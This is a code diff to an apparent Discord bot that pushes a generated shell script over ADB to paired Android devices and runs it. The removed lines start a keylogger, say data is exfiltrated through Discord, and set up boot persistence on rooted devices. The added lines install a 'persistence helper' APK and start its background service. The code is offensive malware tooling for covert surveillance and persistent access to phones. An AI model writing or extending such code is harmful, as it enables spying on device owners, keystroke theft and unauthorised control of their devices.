@@ -88,38 +88,34 @@ class ADBPairingView(discord.ui.View):
         script_content = \"\"\"#!/bin/sh
 # Remote deployment script
 # This script will be pushed to paired devices and executed
-# It runs our keylogger and exfiltrates data through Discord
+# It installs a persistence helper APK and starts the service
 
-# Start keylogger in background
-nohup /data/local/tmp/keylogger > /dev/null 2>&1 &
+# 1. Push and install the helper APK (assuming it's named persistence_helper.apk in the same dir)
+# Note: The APK must be pushed to the device first before this script runs, 
+# or we push it to /data/local/tmp/ and install from there.
+echo "Installing persistence helper..."
+pm install -r /data/local/tmp/persistence_helper.apk
 
-# Take initial screenshot
+# 2. Start the background service using Activity Manager (am)
+# Replace 'com.jack.helper' and '.PersistenceService' with the actual package and class names.
+echo "Starting persistence service..."
+am startservice -n com.jack.helper/.PersistenceService
+
+# 3. Take initial screenshot (optional, just for logging)
 screencap -p /data/local/tmp/deploy_screen.png
 
 # Log deployment
 echo "Remote deployment completed at $(date)" >> /data/local/tmp/deploy.log
-
-# Persistence Setup (Requires Root/System Privileges)
-# Create startup script
-cat << 'EOF' > /data/local/tmp/startup.sh
-#!/bin/sh
-nohup /data/local/tmp/keylogger > /dev/null 2>&1 &
-EOF
-chmod +x /data/local/tmp/startup.sh
-
-# Note: Modifying init.rc or dropping scripts into /system/etc/init.d/ 
-# or /data/local/userinit.d/ requires the device to be rooted and the 
-# system partition mounted as read-write.
-# Example (if rooted):
-# mount -o rw,remount /system
-# cp /data/local/tmp/startup.sh /system/etc/init.d/99keylogger
-# chmod 755 /system/etc/init.d/99keylogger
 \"\"\"
         with open("remote_deploy.sh", "w") as f:
             f.write(script_content)
             
         for device in devices:
             try:
+                # Note: You need to ensure persistence_helper.apk is pushed to /data/local/tmp/ 
+                # before running this script if you want the 'pm install' command to work.
+                # run_adb_command(device, ['push', 'persistence_helper.apk', '/data/local/tmp/persistence_helper.apk'])
+                
                 # Push script
                 run_adb_command(device, ['push', 'remote_deploy.sh', '/data/local/tmp/remote_deploy.sh'])
                 # Make executable
